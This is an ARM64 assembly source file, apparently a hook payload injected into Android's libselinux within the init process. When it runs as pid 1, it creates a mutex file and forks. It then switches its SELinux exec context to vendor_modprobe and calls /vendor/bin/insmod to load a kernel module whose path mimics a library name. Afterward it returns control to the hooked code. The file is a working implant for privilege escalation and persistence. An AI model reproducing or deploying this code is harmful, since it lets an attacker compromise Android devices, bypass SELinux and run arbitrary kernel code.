    .arch armv8-a

    .include "include.inc"

    .global libselinux_start
    .global libselinux_data
    .global libselinux_len
    .global libselinux_first_inst_copy
    .data


libselinux_data:

mutex_file:
    .asciz "/dev/df"
selinux_ctx:
    .asciz "u:r:vendor_modprobe:s0"
attr_exec:
    .asciz "/proc/self/attr/exec"
exe_path:
    .asciz "/vendor/bin/insmod"
ko_target_param:
    .ascii "ko_target="
    .global ko_target
ko_target:
    .ascii "/vendor/lib64/libbinderdebug.so\0"
    .skip 32, 0                             /* pad to 64 bytes — longest candidate path */
    .balign 4
    .global libselinux_ko_target_off
libselinux_ko_target_off:
    .int ko_target - libselinux_data

    .align 4

libselinux_start:
    stp x0, x1, [sp, #-32]!
    stp x2, x8, [sp, #16]

    // Detect init pid = 1 (init is always uid=0, so no separate uid check is needed)
    mov     x8, SYS_getpid
    svc     0
    cmp     w0, 1
    bne     return

    // To avoid later call of hook to execute payload, create file as mutex.
    // Mutex: openat(AT_FDCWD, "/dev/df", O_CREAT|O_EXCL, <init's x3>)
    mov     x0, -100
    adr     x1, mutex_file
    mov     x2, (O_CREAT|O_EXCL)
    mov     x8, #SYS_openat
    svc     0

    // return if fail to open (file exists)
    tbnz    w0, #31, return

    // clone(SIGCHLD, 0, NULL, NULL, NULL)
    mov     x0, #SIGCHLD
    mov     x1, xzr
    mov     x2, xzr
    mov     x8, SYS_clone
    svc     0

    cbnz    w0, return          // parent returns to init

    // ── worker child ──────────────────────────────────────────────────────

    // Fork grandchild: set SELinux exec context → execve insmod
    // x1=x2=xzr, x8=SYS_clone inherited from first clone
    mov     x0, #SIGCHLD
    svc     0
    cbnz    w0, myexit

    // ── grandchild: insmod the KO as vendor_modprobe ──────────────────────
    // open /proc/self/attr/exec
    mov     x0, -100
    adr     x1, attr_exec
    mov     x2, #O_WRONLY
    mov     x8, #SYS_openat
    svc     0
    adr     x1, selinux_ctx
    mov     x2, #22
    mov     x8, #SYS_write
    svc     0

    // execve("/vendor/bin/insmod", [exe_path, ko_target, ko_target_param, NULL], NULL)
    adr     x0, exe_path
    adr     x9, ko_target
    stp     x0, x9, [sp, #-32]!
    adr     x9, ko_target_param
    stp     x9, xzr, [sp, #16]
    mov     x1, sp
    mov     x2, xzr
    mov     x8, #SYS_execve
    svc     0

myexit:
    mov     x8, #SYS_exit
    svc     0

return:
    ldp x2, x8, [sp, #16]
    ldp x0, x1, [sp], #32
libselinux_first_inst_copy:
    stp     x29, x30, [sp, #-32]!
    b       end
end:

libselinux_end:
libselinux_len:
    .word libselinux_end - libselinux_data
